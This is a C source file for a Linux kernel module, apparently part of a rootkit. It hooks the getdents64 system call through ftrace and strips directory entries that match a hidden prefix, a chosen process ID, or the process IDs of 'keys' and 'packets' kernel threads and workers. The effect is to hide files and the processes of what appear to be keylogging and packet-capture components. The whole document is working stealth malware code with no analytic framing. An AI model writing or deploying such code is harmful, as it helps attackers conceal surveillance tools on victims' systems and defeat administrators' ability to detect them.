#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include "ftrace_helper.h"
#include "hide_files.h"
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
// init pid buffers
char keys_kthread_pid[PID_MAX] = {0};
char packets_kthread_pid[PID_MAX] = {0};
char hide_pid[PID_MAX] = {0};
char keys_worker[PID_MAX] = {0};
char packets_worker[PID_MAX] = {0};

// for 64 bit systems (x86_64)
static asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker = NULL, *new_dirent_ker = NULL;
    unsigned long offset = 0, new_offset = 0;

    // read dents from the original syscall
    int ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    // allocate kernel memory for the dirent buffer
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker)
        return ret;

    // copy the dirent buffer from user space to kernel space
    if (copy_from_user(dirent_ker, dirent, ret))
    {
        kfree(dirent_ker);
        return ret;
    }

    // allocate kernel memory for the new dirent buffer, excluding entries with the prefix
    new_dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!new_dirent_ker)
    {
        kfree(dirent_ker);
        return ret;
    }

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;



        // check if the current entry has the prefix/hidden pid(kthreads or chosen pid)
        bool is_prefix = memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0;
        bool is_keys_kthred_pid = strlen(keys_kthread_pid) != 0 && memcmp(keys_kthread_pid, current_dir->d_name, strlen(keys_kthread_pid)) == 0;
        bool is_packets_kthred_pid = strlen(packets_kthread_pid) != 0 && memcmp(packets_kthread_pid, current_dir->d_name, strlen(packets_kthread_pid)) == 0;
        bool is_hide_pid = strlen(hide_pid) != 0 && memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0;
        bool is_keys_worker = strlen(keys_worker) != 0 && memcmp(keys_worker, current_dir->d_name, strlen(keys_worker)) == 0;
        bool is_packets_worker = strlen(packets_worker) != 0 && memcmp(packets_worker, current_dir->d_name, strlen(packets_worker)) == 0;
        if(!is_prefix && !is_keys_kthred_pid && !is_packets_kthred_pid && !is_hide_pid && !is_keys_worker && !is_packets_worker)
        {
            memcpy((void *)new_dirent_ker + new_offset, current_dir, current_dir->d_reclen);
            new_offset += current_dir->d_reclen;
        }

    offset += current_dir->d_reclen;
    }


    if (copy_to_user(dirent, new_dirent_ker, new_offset))
    {
        kfree(dirent_ker);
        kfree(new_dirent_ker);
        return ret;
    }

    kfree(dirent_ker);
    kfree(new_dirent_ker);
    return new_offset; // Return the size of the new buffer
}

// export hooks
struct ftrace_hook hide_files_hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};
